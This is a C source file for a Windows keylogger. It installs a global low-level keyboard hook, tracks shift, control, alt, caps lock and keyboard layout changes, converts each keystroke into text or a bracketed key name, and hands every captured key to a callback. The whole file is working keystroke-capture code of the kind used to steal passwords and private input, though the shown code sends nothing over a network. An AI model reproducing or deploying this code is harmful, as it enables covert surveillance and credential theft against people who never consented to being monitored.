#include "keylogger.h"
#include "dictionary.h"

keyloggerCallback callback;
HHOOK keyboardHook = NULL;

u8 lShiftPressed = 0, rShiftPressed = 0, keyAfterShift = 1;
u8 lControlPressed = 0, rControlPressed = 0, keyAfterControl = 1;
u8 lAltPressed = 0, rAltPressed = 0, keyAfterAlt = 1;
char chr[65] = {0};
HKL lastKeyboardLayout;

void toUpperCase(char* buffer) {
    u32 len = strlen(buffer);
    for (u32 i = 0; i < len; i++) {
        u8 c = (u8)buffer[i];
        if (c >= 0x61 && c <= 0x7A) {
            c -= 0x20;
        } else if (c >= 0xE0 && c <= 0xFD) {
            c -= 0x20;
        }
        buffer[i] = (char) c;
    }
}

void toLowerCase(char* buffer) {
    u32 len = strlen(buffer);
    for (u32 i = 0; i < len; i++) {
        u8 c = (u8)buffer[i];
        if (c >= 0x41 && c <= 0x5A) {
            c += 0x20;
        } else if (c >= 0xC0 && c <= 0xDD) {
            c += 0x20;
        }
        buffer[i] = (char) c;
    }
}

int getKeyName(u32 vkCode, char* buffer, u32 size) {
    u32 vsc = MapVirtualKey(vkCode, 0); //MAPVK_VK_TO_VSC
    switch (vkCode) {
        case VK_LEFT: case VK_UP: case VK_RIGHT: case VK_DOWN:
        case VK_PRIOR: case VK_NEXT:
        case VK_END: case VK_HOME:
        case VK_INSERT: case VK_DELETE:
        case VK_DIVIDE:
        case VK_NUMLOCK: {
            vsc |= 0x100; //Set extended bit
            break;
        }
    }
    if (GetKeyNameText(vsc * 0x10000, buffer, size) == 0) {
        return 1;
    }
    return 0;
}

void dictionary(u32 key) {
    memset(chr, 0, 65);
    u8 test = MapVirtualKey(key, 2); //MAPVK_VK_TO_CHAR
    u8 shift = 0, alt = 0, control = 0;
    if (lShiftPressed == 1 || rShiftPressed == 1) shift = 1;
    if (lAltPressed == 1 || rAltPressed == 1) alt = 1;
    if (lControlPressed == 1 || rControlPressed == 1) control = 1;
    char ret = getCharFromCombination(key, control, alt, shift);
    if (ret > 9) {
        if (shift == 1) keyAfterShift = 1;
        if (alt == 1) keyAfterAlt = 1;
        if (control == 1) keyAfterControl = 1;
        chr[0] = ret;
        if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
            if (shift == 1) toLowerCase(chr);
            if (shift == 0) toUpperCase(chr);
        }
    } else if ((test >= 0x20 && test <= 0xFE) && test != 0x7F) { //Check if is printable
        if ((test >= 0x41 && test <= 0x5A) || (test >= 0x61 && test <= 0x7A) ||
            (test >= 0xC0 && test <= 0xDD) || (test >= 0xE0 && test <= 0xFD)) {
            keyAfterShift = 1;
        }
        u8 isCap = 0;
        if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
            isCap = 1;
        }
        if (shift == 1) isCap = 1 - isCap;
        chr[0] = test;
        if (isCap == 1) {
            toUpperCase(chr);
        } else {
            toLowerCase(chr);
        }
        /*
        if (isCap == 0 && ((test >= 0x41 && test <= 0x5A) || (test >= 0xC0 && test <= 0xDF))) {
            test += 0x20; //if caps, check if has transformation (from capitalized key to no capitalized key)
        }
        if (isCap == 1 && ((test >= 0x61 && test <= 0x7A) || (test >= 0xE0 && test <= 0xFF))) {
            test -= 0x20; //Same as before but from uncapitalized to capitalized (special characters, rare cases)
        }
        */
    } else {
        char keyName[65];
        if (getKeyName(key, keyName, 65) == 1) {
            memset(keyName, 0, 65);
            strcpy(keyName, "UNKNOWN KEY");
        }
        chr[0] = '[';
        strcpy(chr + 1, keyName);
        chr[strlen(chr)] = ']';
    }
}

LRESULT CALLBACK keyloggerHook(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        HKL currentKeyboardLayout = GetKeyboardLayout(NULL);
        if (lastKeyboardLayout != currentKeyboardLayout) {
            lastKeyboardLayout = currentKeyboardLayout;
            constructKeyDictionary();
        }
        KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*) lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            if (key->vkCode == VK_LSHIFT) {
                lShiftPressed = 1;
                keyAfterShift = 0;
            } else if (key->vkCode == VK_RSHIFT) {
                rShiftPressed = 1;
                keyAfterShift = 0;
            } else if (key->vkCode == VK_LCONTROL) {
                lControlPressed = 1;
                keyAfterControl = 0;
            } else if (key->vkCode == VK_RCONTROL) {
                rControlPressed = 1;
                keyAfterControl = 0;
            } else if (key->vkCode == VK_LMENU) {
                lAltPressed = 1;
                keyAfterAlt = 0;
            } else if (key->vkCode == VK_RMENU) {
                rAltPressed = 1;
                keyAfterAlt = 0;
            } else {
                dictionary(key->vkCode);
                callback(chr);
            }
        } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
            if (key->vkCode == VK_LSHIFT) {
                lShiftPressed = 0;
                if (keyAfterShift == 0) {
                    keyAfterShift = 1;
                    dictionary(key->vkCode);
                    callback(chr);
                }
            } else if (key->vkCode == VK_RSHIFT) {
                rShiftPressed = 0;
                if (keyAfterShift == 0) {
                    keyAfterShift = 1;
                    dictionary(key->vkCode);
                    callback(chr);
                }
            } else if (key->vkCode == VK_LCONTROL) {
                lControlPressed = 0;
                if (keyAfterControl == 0) {
                    keyAfterControl = 1;
                    dictionary(key->vkCode);
                    callback(chr);
                }
            } else if (key->vkCode == VK_RCONTROL) {
                rControlPressed = 0;
                if (keyAfterControl == 0) {
                    keyAfterControl = 1;
                    dictionary(key->vkCode);
                    callback(chr);
                }
            } else if (key->vkCode == VK_LMENU) {
                lAltPressed = 0;
                if (keyAfterAlt == 0) {
                    keyAfterAlt = 1;
                    dictionary(key->vkCode);
                    callback(chr);
                }
            } else if (key->vkCode == VK_RMENU) {
                rAltPressed = 0;
                if (keyAfterAlt == 0) {
                    keyAfterAlt = 1;
                    dictionary(key->vkCode);
                    callback(chr);
                }
            }
        }
    }
    return CallNextHookEx(keyboardHook, code, wParam, lParam);
}

void startKeylogger(HINSTANCE hInstance, keyloggerCallback cb) {
    lastKeyboardLayout = GetKeyboardLayout(NULL);
    constructKeyDictionary();
    callback = cb;
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyloggerHook, hInstance, NULL);
    MSG msg;
    while (GetMessage(&msg, NULL, NULL, NULL)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(keyboardHook);
}
